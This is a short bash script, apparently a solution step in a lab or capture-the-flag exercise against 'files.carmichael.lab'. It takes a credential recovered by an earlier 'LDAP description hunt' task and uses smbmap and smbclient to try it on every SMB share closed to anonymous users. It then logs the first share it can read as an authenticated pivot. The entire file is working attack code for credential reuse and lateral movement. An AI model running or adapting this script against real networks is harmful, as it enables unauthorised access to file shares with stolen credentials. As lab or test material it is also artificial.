#!/bin/bash
mkdir -p results
cred=$(sed -n '1p' results/9-ldap_description_hunt.txt 2>/dev/null)
[ -z "$cred" ] && { echo "no credential from task 9" >&2; exit 1; }
user=${cred%%:*}
pass=${cred#*:}
for share in $(smbmap -H files.carmichael.lab -u "" -p "" 2>/dev/null | tr -d '\r' |
               awk '$0 ~ /NO ACCESS/ && $1 ~ /^[a-zA-Z0-9_-]+$/ {print $1}'); do
  if smbclient //files.carmichael.lab/"$share" -U "$user%$pass" -c "ls" >/dev/null 2>&1; then
    printf '%s: READ granted as %s\n' "$share" "$user" | tee results/11-auth_pivot.txt
    exit 0
  fi
done
echo "no share reachable with the recovered credential" >&2
exit 1
